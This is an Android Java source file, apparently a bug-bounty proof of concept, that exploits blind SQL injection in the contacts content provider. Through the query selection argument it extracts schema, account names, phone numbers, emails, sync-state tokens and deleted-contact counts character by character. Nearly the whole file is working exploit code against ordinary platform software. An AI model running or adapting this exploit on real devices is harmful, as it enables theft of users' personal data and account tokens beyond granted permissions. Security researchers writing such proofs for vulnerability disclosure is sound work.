package com.vrp.poc;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;
import android.widget.ScrollView;
import android.widget.LinearLayout;
import android.widget.TextView;

public class ContactsBlindSqliActivity extends Activity {
    private static final String TAG = "ContactsBlindSQLi";
    private TextView logView;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        ScrollView sv = new ScrollView(this);
        LinearLayout ll = new LinearLayout(this);
        ll.setOrientation(LinearLayout.VERTICAL);
        ll.setPadding(20, 20, 20, 20);
        logView = new TextView(this);
        logView.setTextSize(9);
        logView.setText("ContactsProvider Blind SQLi PoC\nUID: " + android.os.Process.myUid() + "\n\n");
        ll.addView(logView);
        sv.addView(ll);
        setContentView(sv);

        new Thread(this::runTests).start();
    }

    private void log(String msg) {
        Log.d(TAG, msg);
        runOnUiThread(() -> logView.append(msg + "\n"));
    }

    private int queryCount(Uri uri, String selection) {
        try {
            Cursor c = getContentResolver().query(uri, new String[]{"_id"}, selection, null, null);
            if (c != null) {
                int count = c.getCount();
                c.close();
                return count;
            }
        } catch (Exception e) {
            return -1;
        }
        return -1;
    }

    private void runTests() {
        Uri uri = Uri.parse("content://com.android.contacts/contacts");

        // Verify baseline: how many contacts exist
        int baseline = queryCount(uri, null);
        log("Baseline: " + baseline + " contacts");
        if (baseline <= 0) {
            log("ABORT: Need at least 1 contact for blind SQLi");
            return;
        }

        // Test 1: Confirm subquery execution — count tables
        log("\n=== Test 1: Confirm subquery execution ===");
        int trueCount = queryCount(uri, "(SELECT count(*) FROM sqlite_master WHERE type='table') > 0");
        int falseCount = queryCount(uri, "(SELECT count(*) FROM sqlite_master WHERE type='table') > 999");
        log("(tables > 0): " + trueCount + " rows | (tables > 999): " + falseCount + " rows");
        if (trueCount > 0 && falseCount == 0) {
            log("[CONFIRMED] Boolean-based blind SQLi works");
        } else {
            log("Blind SQLi may not work (true=" + trueCount + ", false=" + falseCount + ")");
            if (trueCount <= 0) return;
        }

        // Test 2: Extract exact table count
        log("\n=== Test 2: Extract table count ===");
        int tableCount = extractNumber(uri, "(SELECT count(*) FROM sqlite_master WHERE type='table')");
        log("Table count: " + tableCount);

        // Test 3: Extract table names character by character
        log("\n=== Test 3: Extract table names ===");
        for (int tblIdx = 0; tblIdx < Math.min(tableCount, 10); tblIdx++) {
            String name = extractString(uri,
                "(SELECT name FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET " + tblIdx + ")",
                50);
            log("Table[" + tblIdx + "]: " + name);
        }

        // Test 4: Extract data from internal tables beyond READ_CONTACTS scope
        log("\n=== Test 4: Cross-table data extraction ===");

        // 4a: Extract account names from accounts table
        log("--- Accounts table ---");
        int acctCount = extractNumber(uri, "(SELECT count(*) FROM accounts)");
        log("Account count: " + acctCount);
        for (int i = 0; i < Math.min(acctCount, 3); i++) {
            String acctName = extractString(uri,
                "(SELECT account_name FROM accounts LIMIT 1 OFFSET " + i + ")", 60);
            String acctType = extractString(uri,
                "(SELECT account_type FROM accounts LIMIT 1 OFFSET " + i + ")", 60);
            log("Account[" + i + "]: " + acctName + " (" + acctType + ")");
        }

        // 4b: Extract phone numbers from data table (cross-table!)
        log("--- Phone numbers from internal data table ---");
        int phoneCount = extractNumber(uri,
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2'))");
        log("Phone entries: " + phoneCount);
        for (int i = 0; i < Math.min(phoneCount, 5); i++) {
            String phone = extractString(uri,
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/phone_v2') LIMIT 1 OFFSET " + i + ")",
                20);
            log("Phone[" + i + "]: " + phone);
        }

        // 4c: Extract emails from data table
        log("--- Emails from internal data table ---");
        int emailCount = extractNumber(uri,
            "(SELECT count(*) FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2'))");
        log("Email entries: " + emailCount);
        for (int i = 0; i < Math.min(emailCount, 5); i++) {
            String email = extractString(uri,
                "(SELECT data1 FROM data WHERE mimetype_id=(SELECT _id FROM mimetypes WHERE mimetype='vnd.android.cursor.item/email_v2') LIMIT 1 OFFSET " + i + ")",
                60);
            log("Email[" + i + "]: " + email);
        }

        // 4d: Extract sync state data
        log("--- Sync state ---");
        int syncCount = extractNumber(uri, "(SELECT count(*) FROM _sync_state)");
        log("Sync state entries: " + syncCount);
        for (int i = 0; i < Math.min(syncCount, 3); i++) {
            String syncAcct = extractString(uri,
                "(SELECT account_name FROM _sync_state LIMIT 1 OFFSET " + i + ")", 60);
            log("SyncState[" + i + "]: " + syncAcct);
        }

        // 4e: Extract raw sync token from _sync_state.data column
        log("--- Sync state raw token ---");
        int syncDataLen = extractNumber(uri, "(SELECT length(data) FROM _sync_state LIMIT 1)");
        log("SyncState data length: " + syncDataLen + " bytes");
        if (syncDataLen > 0) {
            String syncToken = extractString(uri,
                "(SELECT data FROM _sync_state LIMIT 1)", Math.min(syncDataLen, 40));
            log("SyncState token (first 40 chars): " + syncToken);
        }

        // Test 5: Try to access deleted contacts (soft-deleted data)
        log("\n=== Test 5: Deleted contacts data ===");
        int deletedCount = extractNumber(uri,
            "(SELECT count(*) FROM raw_contacts WHERE deleted=1)");
        log("Deleted raw_contacts: " + deletedCount);

        int dirtyCount = extractNumber(uri,
            "(SELECT count(*) FROM raw_contacts WHERE dirty=1)");
        log("Dirty raw_contacts: " + dirtyCount);

        // Test 6: Extract sqlite_master schema for security assessment
        log("\n=== Test 6: Schema extraction (first 3 tables) ===");
        for (int i = 0; i < Math.min(3, tableCount); i++) {
            String sql = extractString(uri,
                "(SELECT sql FROM sqlite_master WHERE type='table' LIMIT 1 OFFSET " + i + ")",
                200);
            log("Schema[" + i + "]: " + sql);
        }

        log("\n=== ALL TESTS COMPLETE ===");
    }

    private int extractNumber(Uri uri, String subquery) {
        int lo = 0, hi = 1000;
        // First find upper bound
        while (queryCount(uri, subquery + " > " + hi) > 0) {
            hi *= 2;
            if (hi > 100000) return -1;
        }
        // Binary search
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(uri, subquery + " > " + mid);
            if (result > 0) {
                lo = mid + 1;
            } else if (result == 0) {
                hi = mid;
            } else {
                return -1;
            }
        }
        return lo;
    }

    private String extractString(Uri uri, String subquery, int maxLen) {
        StringBuilder result = new StringBuilder();
        for (int pos = 1; pos <= maxLen; pos++) {
            int charCode = extractCharCode(uri, subquery, pos);
            if (charCode <= 0) break;
            result.append((char) charCode);
        }
        return result.toString();
    }

    private int extractCharCode(Uri uri, String subquery, int pos) {
        String expr = "(SELECT unicode(substr(" + subquery + "," + pos + ",1)))";

        // Check if position is valid (not past end of string)
        int lenCheck = queryCount(uri, "length(" + subquery + ") >= " + pos);
        if (lenCheck <= 0) return -1;

        // Binary search for the character code
        int lo = 0, hi = 127;
        while (lo < hi) {
            int mid = (lo + hi) / 2;
            int result = queryCount(uri, expr + " > " + mid);
            if (result > 0) {
                lo = mid + 1;
            } else if (result == 0) {
                hi = mid;
            } else {
                return -1;
            }
        }
        return lo;
    }
}
